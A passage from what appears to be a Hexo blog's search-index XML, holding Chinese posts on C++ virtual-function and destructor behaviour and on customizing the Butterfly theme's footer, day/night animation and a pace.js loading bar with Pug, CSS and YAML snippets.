d;  <span class="comment">// Base-ctor  Derived-ctor</span></span><br><span class="line">    Base *pb = <span class="keyword">new</span> Derived; <span class="comment">// Base-ctor  Derived-ctor 就是构造一个派生类，先调用基类构造函数再调用派生类构造函数</span></span><br><span class="line">    b.<span class="built_in">f</span>(<span class="number">1.0</span>);   <span class="comment">// Base::f(double)</span></span><br><span class="line">    d.<span class="built_in">f</span>(<span class="number">1.0</span>);   <span class="comment">// Derived::f(complex)</span></span><br><span class="line">    pb-&gt;<span class="built_in">f</span>(<span class="number">1.0</span>); <span class="comment">// Base::f(double)  1.0-&gt;double，派生类中没有(double比complex优先匹配)，直接调用基类的double</span></span><br><span class="line">    b.<span class="built_in">g</span>();      <span class="comment">// Base::g()10</span></span><br><span class="line">    d.<span class="built_in">g</span>();      <span class="comment">// Derived::g()20</span></span><br><span class="line">    pb-&gt;<span class="built_in">g</span>();    <span class="comment">// Derived::g()10</span></span><br><span class="line">    <span class="keyword">delete</span> pb;  <span class="comment">// Base-dtor !!!删除只看指针类型进行析构！！！</span></span><br><span class="line">    <span class="comment">// Derived-dtor</span></span><br><span class="line">    <span class="comment">// Base-dtor</span></span><br><span class="line">    <span class="comment">// Base-dtor</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2023/05/11/p9rBE2d.png" alt="运行结果"></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>内存大小我也不是很清楚是如何计算的，但是后续输出大概搞懂了</p><ol><li><p>定义基类对象b：调用基类构造函数</p></li><li><p>定义派生类对象d：先调用基类构造函数，再调用派生类构造函数</p></li><li><p>定义基类指针指向派生类对象：实际上就是创建了一个派生类对象，同样是先调用基类构造函数，再调用派生类构造函数</p></li><li><p>b.f(1.0)：调用基类的f(double)</p></li><li><p>d.f(1.0)：优先匹配派生类对象的函数，符合complex类型(复数类，如果只输入一个值，默认作为实部)，调用派生类的f(complex)</p></li><li><p>pb-&gt;f(1.0)：pb为基类指针，f为虚函数但是1.0优先匹配double-&gt;调用基类的f(double)，如果删除基类的f(double)就会调用派生类的f(complex)</p></li><li><p>b.g()：调用基类的g(int)，未指定值默认输出10</p></li><li><p>d.g()：调用派生类的g(int)，未指定值默认输出20</p></li><li><p>pb-&gt;g()：这个我只是勉强可以理解，但是具体原理我也不太明白，pb为基类指针，g()为虚函数，如果派生类的该同名函数与基类的该函数在参数(个数与数据类型)上完全一致的话，程序会选择执行派生类的该函数并将基类的该函数的形参值赋给派生类的相应形参；如果派生类的该同名函数与基类的该函数在参数(个数与数据类型)上并非完全一致，则直接执行基类的该函数</p></li><li><p><strong>delete pb</strong>：这个很容易判断出错，注意看这个程序对基类析构函数的定义：不是虚析构函数！！！因此虽然定义了一个派生类指针但是却只会执行基类析构函数 </p><p><em>如果是使用系统默认析构函数的话，会一并析构基类与派生类，因为<strong>系统定义的析构函数是虚析构函数</strong>，因此可以执行到派生类的析构函数，所以我们如果自己要定义析构函数，推荐都定义为虚析构函数，即<code>virtual ~Base() &#123;&#125;</code></em></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> c++ </category>
          
          <category> 程序分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> c++语法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>博客自定义页脚</title>
      <link href="/post/a4906bff.html"/>
      <url>/post/a4906bff.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>转载自：<a href="https://tzy1997.com/articles/hexo1617/">唐志远の博客</a></p><details class="folding-tag" ><summary> 效果预览 </summary>              <div class='content'>              <p><img src="https://s1.ax1x.com/2023/05/10/p9DbSw8.png" alt=""></p>              </div>            </details><p><strong><code>ps</code>：升级版页脚请移步：<a href="https://www.dqywy.top/post/63a1f478.html">页脚美化</a></strong></p><details class="folding-tag" ><summary> 升级版效果预览 </summary>              <div class='content'>              <p><img src="https://s1.ax1x.com/2023/06/01/p9xfxJ0.png" alt=""></p>              </div>            </details><h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><ol><li><p>直接将<code>BlogRoot/themes/butterfly/layout/includes/footer.pug</code>中的所有代码替换为如下代码并自行修改内容:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">#footer-wrap</span><br><span class="line">  #ft</span><br><span class="line">    .ft-item-1</span><br><span class="line">      .t-top</span><br><span class="line">        .t-t-l</span><br><span class="line">          p.ft-t.t-l-t Welcome</span><br><span class="line">          .bg-ad</span><br><span class="line">            div</span><br><span class="line">              | --- DQY ❤ WY ---</span><br><span class="line">            .btn-xz-box</span><br><span class="line">              a.btn-xz(href=&#x27;https://www.dqywy.top/about/&#x27;) 关于站长</span><br><span class="line">        .t-t-r</span><br><span class="line">          p.ft-t.t-l-t 博客导航</span><br><span class="line">          ul.ft-links</span><br><span class="line">            li</span><br><span class="line">              a(href=&#x27;https://www.dqywy.top/categories/博客/&#x27;) 建站指南</span><br><span class="line">              a(href=&#x27;https://www.dqywy.top/ToDoList/&#x27;) 待做清单</span><br><span class="line">            li</span><br><span class="line">              a(href=&#x27;https://www.dqywy.top/categories/&#x27;) 文章分类</span><br><span class="line">              a(href=&#x27;https://www.dqywy.top/tags/&#x27;) 文章标签</span><br><span class="line">            li</span><br><span class="line">              a(href=&#x27;https://www.dqywy.top/archives/&#x27;) 时间轴</span><br><span class="line">              a(href=&#x27;https://www.dqywy.top/about/&#x27;) 关于博主</span><br><span class="line"></span><br><span class="line">    .ft-item-2</span><br><span class="line">      p.ft-t 推荐友链</span><br><span class="line">      .ft-img-group</span><br><span class="line">        .img-group-item</span><br><span class="line">          a(href=&#x27;http://47.109.96.67:4000/&#x27;)</span><br><span class="line">            img(src=&#x27;https://s1.ax1x.com/2023/05/07/p9wAPit.jpg&#x27; alt=&#x27;狗墙&#x27;)</span><br><span class="line"></span><br><span class="line">  if theme.footer.owner.enable</span><br><span class="line">    - var now = new Date()</span><br><span class="line">    - var nowYear = now.getFullYear()</span><br><span class="line">    if theme.footer.owner.since &amp;&amp; theme.footer.owner.since != nowYear</span><br><span class="line">      .copyright!= `&amp;copy;$&#123;theme.footer.owner.since&#125; - $&#123;nowYear + &#x27; &#x27;&#125; &lt;i id=&quot;heartbeat&quot; class=&quot;fa fas fa-heartbeat&quot;&gt;&lt;/i&gt; $&#123;config.author&#125;`</span><br><span class="line">    else</span><br><span class="line">      .copyright!= `&amp;copy;$&#123;nowYear + &#x27; &#x27;&#125; &lt;i id=&quot;heartbeat&quot; class=&quot;fa fas fa-heartbeat&quot;&gt;&lt;/i&gt; $&#123;config.author&#125;`</span><br><span class="line">  if theme.footer.copyright</span><br><span class="line">    .framework-info</span><br><span class="line">      span= _p(&#x27;footer.framework&#x27;) + &#x27; &#x27;</span><br><span class="line">      a(href=&#x27;https://hexo.io&#x27;)= &#x27;Hexo&#x27;</span><br><span class="line">      span.footer-separator |</span><br><span class="line">      span= _p(&#x27;footer.theme&#x27;) + &#x27; &#x27;</span><br><span class="line">      a(href=&#x27;https://github.com/jerryc127/hexo-theme-butterfly&#x27;)= &#x27;Butterfly&#x27;</span><br><span class="line">  if theme.footer.custom_text</span><br><span class="line">    .footer_custom_text!=`$&#123;theme.footer.custom_text&#125;`</span><br></pre></td></tr></table></figure></li><li><p>打开<code>Blog\source\css\custom.css</code>，缺少的文件夹或文件直接创建即可，添加下列代码</p><p><code>ps</code>：下列代码的第7行，注释掉-&gt;白天模式文字为黑色，黑夜模式文字为白色；不注释掉-&gt;白天黑夜均为你自定义的颜色</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/* 自定义底部  start */</span></span><br><span class="line"><span class="selector-id">#ft</span> &#123;</span><br><span class="line">    <span class="attribute">max-width</span>: <span class="number">1200px</span>;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">0</span> auto <span class="number">12px</span>;</span><br><span class="line">    <span class="attribute">display</span>: flex;</span><br><span class="line">    <span class="comment">/*color: rgb(255 255 255 / 80%) !important;*/</span></span><br><span class="line">    <span class="attribute">text-align</span>: left;</span><br><span class="line">    <span class="attribute">flex-wrap</span>: wrap;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.ft-item-1</span>,</span><br><span class="line"><span class="selector-class">.ft-item-2</span> &#123;</span><br><span class="line">    <span class="attribute">display</span>: flex;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">100%</span>;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">10px</span> <span class="number">14px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.ft-item-1</span> &#123;</span><br><span class="line">    <span class="attribute">flex-direction</span>: column;</span><br><span class="line">    <span class="attribute">flex</span>: <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.ft-item-2</span> &#123;</span><br><span class="line">    <span class="attribute">flex</span>: <span class="number">1</span>;</span><br><span class="line">    <span class="attribute">flex-direction</span>: column;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.t-top</span> &#123;</span><br><span class="line">    <span class="attribute">display</span>: flex;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.t-top</span> <span class="selector-class">.t-t-l</span> &#123;</span><br><span class="line">    <span class="attribute">display</span>: flex;</span><br><span class="line">    <span class="attribute">flex-direction</span>: column;</span><br><span class="line">    <span class="attribute">flex</span>: <span class="number">1.4</span>;</span><br><span class="line">    <span class="attribute">margin-right</span>: <span class="number">10px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.t-top</span> <span class="selector-class">.t-t-l</span> <span class="selector-class">.bg-ad</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">85%</span>;</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="number">10px</span>;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">0</span> <span class="number">10px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.btn-xz-box</span> &#123;</span><br><span class="line">    <span class="attribute">margin-top</span>: <span class="number">10px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.btn-xz</span> &#123;</span><br><span class="line">    <span class="attribute">display</span>: block;</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="built_in">var</span>(--btn-bg);</span><br><span class="line">    <span class="attribute">color</span>: <span class="built_in">var</span>(--btn-color);</span><br><span class="line">    <span class="attribute">text-align</span>: center;</span><br><span class="line">    <span class="attribute">line-height</span>: <span class="number">2.4</span>;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">8px</span> <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">cursor</span>: pointer <span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.btn-xz</span><span class="selector-pseudo">:hover</span> &#123;</span><br><span class="line">    <span class="attribute">text-decoration</span>: none <span class="meta">!important</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.btn-xz-box</span><span class="selector-pseudo">:hover</span> <span class="selector-class">.btn-xz</span> &#123;</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="number">#6f42c1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.t-top</span> <span class="selector-class">.t-t-r</span> &#123;</span><br><span class="line">    <span class="attribute">display</span>: flex;</span><br><span class="line">    <span class="attribute">flex-direction</span>: column;</span><br><span class="line">    <span class="attribute">flex</span>: <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.ft-links</span> &#123;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">0</span> <span class="number">14px</span>;</span><br><span class="line">    <span class="attribute">list-style</span>: none;</span><br><span class="line">    <span class="attribute">margin-top</span>: <span class="number">0</span> <span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.ft-links</span> <span class="selector-tag">li</span> <span class="selector-tag">a</span> &#123;</span><br><span class="line">    <span class="attribute">display</span>: inline-block <span class="meta">!important</span>;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">50%</span>;</span><br><span class="line">    <span class="attribute">cursor</span>: pointer <span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.ft-links</span> <span class="selector-tag">li</span> <span class="selector-tag">a</span><span class="selector-pseudo">:hover</span> &#123;</span><br><span class="line">    <span class="attribute">text-decoration</span>: none <span class="meta">!important</span>;</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#6f42c1</span> <span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.ft-item-2</span> <span class="selector-class">.ft-img-group</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.ft-t</span> &#123;</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">0.8rem</span>;</span><br><span class="line">    <span class="attribute">margin-bottom</span>: <span class="number">20px</span>;</span><br><span class="line">    <span class="attribute">line-height</span>: <span class="number">1</span>;</span><br><span class="line">    <span class="attribute">font-weight</span>: <span class="number">600</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.t-l-t</span> &#123;</span><br><span class="line">    <span class="attribute">padding-left</span>: <span class="number">14px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.ft-item-2</span> <span class="selector-class">.ft-img-group</span> <span class="selector-class">.img-group-item</span> &#123;</span><br><span class="line">    <span class="attribute">display</span>: inline-block;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">18.4%</span>;</span><br><span class="line">    <span class="attribute">margin-right</span>: <span class="number">14px</span>;</span><br><span class="line">    <span class="attribute">margin-bottom</span>: <span class="number">6px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.ft-item-2</span> <span class="selector-class">.ft-img-group</span> <span class="selector-class">.img-group-item</span> <span class="selector-tag">a</span> &#123;</span><br><span class="line">    <span class="attribute">display</span>: inline-block;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">100%</span>;</span><br><span class="line">    <span class="attribute">cursor</span>: pointer <span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.ft-item-2</span> <span class="selector-class">.ft-img-group</span> <span class="selector-class">.img-group-item</span> <span class="selector-tag">a</span> <span class="selector-tag">img</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">    <span class="attribute">max-height</span>: <span class="number">80px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">@media</span> screen <span class="keyword">and</span> (<span class="attribute">max-width</span>: <span class="number">768px</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="selector-class">.ft-item-1</span> &#123;</span><br><span class="line">        <span class="attribute">flex-basis</span>: <span class="number">100%</span> <span class="meta">!important</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="selector-class">.ft-item-2</span> &#123;</span><br><span class="line">        <span class="attribute">flex-basis</span>: <span class="number">100%</span> <span class="meta">!important</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="selector-class">.t-top</span> <span class="selector-class">.t-t-l</span> <span class="selector-class">.bg-ad</span> &#123;</span><br><span class="line">        <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">@media</span> screen <span class="keyword">and</span> (<span class="attribute">max-width</span>: <span class="number">576px</span>) &#123;</span><br><span class="line">    <span class="selector-class">.t-top</span> &#123;</span><br><span class="line">        <span class="attribute">flex-wrap</span>: wrap;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="selector-class">.t-top</span> <span class="selector-class">.t-t-l</span> &#123;</span><br><span class="line">        <span class="attribute">flex-basis</span>: <span class="number">100%</span> <span class="meta">!important</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="selector-class">.t-top</span> <span class="selector-class">.t-t-r</span> &#123;</span><br><span class="line">        <span class="attribute">margin-top</span>: <span class="number">16px</span>;</span><br><span class="line">        <span class="attribute">flex-basis</span>: <span class="number">100%</span> <span class="meta">!important</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 自定义底部  End */</span></span><br></pre></td></tr></table></figure></li><li><p>将上述代码中的<code>#6f42c1</code>换成你的主题色，引入<code>custom.css</code>: 打开主题配置文件<code>_config.butterfly.yml</code>搜索<code>inject</code>找到<code>head</code>头部：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">-</span> <span class="string">&lt;link</span> <span class="string">rel=&quot;stylesheet&quot;</span> <span class="string">href=&quot;/css/custom.css&quot;</span> <span class="string">media=&quot;defer&quot;</span> <span class="string">onload=&quot;this.media=&#x27;all&#x27;&quot;&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2023/05/10/p9Dq1US.png" alt=""></p></li><li><p>hexo三连查看效果即可</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 博客 </category>
          
          <category> 美化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客美化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>添加白天黑夜模式转换动画</title>
      <link href="/post/aa5bf2dc.html"/>
      <url>/post/aa5bf2dc.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>参考自：<a href="https://akilar.top/posts/d9550c81/">添加白天夜间模式转换动画</a></p><h2 id="实现过程"><a href="#实现过程" class="headerlink" title="实现过程"></a>实现过程</h2><p>参考教程非常详细，只是提一点可能需要注意的地方：+表示新增内容，-表示需要删除的内容，+在添加代码后不要忘记删掉并且删除后代码缩进需要保持不变</p><p><img src="https://s1.ax1x.com/2023/05/10/p9DAigP.png" alt=""></p><p><img src="https://s1.ax1x.com/2023/05/10/p9DAeEQ.png" alt="修改后"></p>]]></content>
      
      
      <categories>
          
          <category> 博客 </category>
          
          <category> 美化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客美化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>添加顶部加载进度条</title>
      <link href="/post/277d5d10.html"/>
      <url>/post/277d5d10.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>参考自：<a href="https://blog.xlenco.top/posts/769f.html">为你的Butterfly添加顶部加载进度条</a></p><details class="folding-tag" ><summary> 效果预览 </summary>              <div class='content'>              <p><img src="https://s1.ax1x.com/2023/05/10/p9DFlin.png" alt=""></p>              </div>            </details><h2 id="查看butterfly版本"><a href="#查看butterfly版本" class="headerlink" title="查看butterfly版本"></a>查看butterfly版本</h2><p><img src="https://s1.ax1x.com/2023/05/10/p9DkimF.png" alt=""></p><p>4.5.0及以上版本主题已内置 <code>pace.js</code> 无需再次引入，打开主题配置文件<code>_config.butterfly.yml</code>搜索<code>preloader</code>并按下列格式修改，修改完直接<code>hexo三连</code>即可</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">preloader:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="comment"># source</span></span><br><span class="line">  <span class="comment"># 1. fullpage-loading</span></span><br><span class="line">  <span class="comment"># 2. pace (progress bar)</span></span><br><span class="line">  <span class="attr">source:</span> <span class="number">2</span></span><br><span class="line">  <span class="comment"># pace theme (see https://codebyzach.github.io/pace/)</span></span><br><span class="line">  <span class="attr">pace_css_url:</span> <span class="string">https://fastly.jsdelivr.net/gh/xlenco/JS-X@main/pace.js/pace.css</span></span><br></pre></td></tr></table></figure><p>4.5.0版本以下需要引入css</p><p>新建<code>Blog\source\css\custom.css</code>，缺少的文件夹或文件直接创建即可，添加下列代码</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.pace</span> &#123;</span><br><span class="line">  <span class="attribute">pointer-events</span>: none;</span><br><span class="line">  user-select: none;</span><br><span class="line">  <span class="attribute">z-index</span>: <span class="number">2</span>;</span><br><span class="line">  <span class="attribute">position</span>: fixed;</span><br><span class="line">  <span class="attribute">margin</span>: auto;</span><br><span class="line">  <span class="attribute">top</span>: <span class="number">4px</span>;</span><br><span class="line">  <span class="attribute">left</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">right</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">8px</span>;</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">8px</span>;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">6rem</span>;</span><br><span class="line">  <span class="attribute">background</span>: <span class="number">#eaecf2</span>;</span><br><span class="line">  <span class="attribute">overflow</span>: hidden;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.pace-inactive</span> <span class="selector-class">.pace-progress</span> &#123;</span><br><span class="line">  <span class="attribute">opacity</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">transition</span>: <span class="number">0.3s</span> ease-in;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.pace</span><span class="selector-class">.pace-inactive</span> &#123;</span><br><span class="line">  <span class="attribute">opacity</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">transition</span>: <span class="number">0.3s</span>;</span><br><span class="line">  <span class="attribute">top</span>: -<span class="number">8px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.pace</span> <span class="selector-class">.pace-progress</span> &#123;</span><br><span class="line">  <span class="attribute">box-sizing</span>: border-box;</span><br><span class="line">  <span class="attribute">transform</span>: <span class="built_in">translate3d</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="attribute">position</span>: fixed;</span><br><span class="line">  <span class="attribute">z-index</span>: <span class="number">2</span>;</span><br><span class="line">  <span class="attribute">display</span>: block;</span><br><span class="line">  <span class="attribute">position</span>: absolute;</span><br><span class="line">  <span class="attribute">top</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">right</span>: <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">background</span>: <span class="number">#49b1f5</span>;</span><br><span class="line">  <span class="attribute">background</span>: <span class="built_in">linear-gradient</span>(</span><br><span class="line">    to right,</span><br><span class="line">    <span class="built_in">rgb</span>(<span class="number">18</span>, <span class="number">194</span>, <span class="number">233</span>),</span><br><span class="line">    <span class="built_in">rgb</span>(<span class="number">196</span>, <span class="number">113</span>, <span class="number">237</span>),</span><br><span class="line">    <span class="built_in">rgb</span>(<span class="number">246</span>, <span class="number">79</span>, <span class="number">89</span>)</span><br><span class="line">  );</span><br><span class="line">  <span class="attribute">animation</span>: gradient <span class="number">2s</span> ease infinite;</span><br><span class="line">  <span class="attribute">background-size</span>: <span class="number">200%</span>;</span><br><span 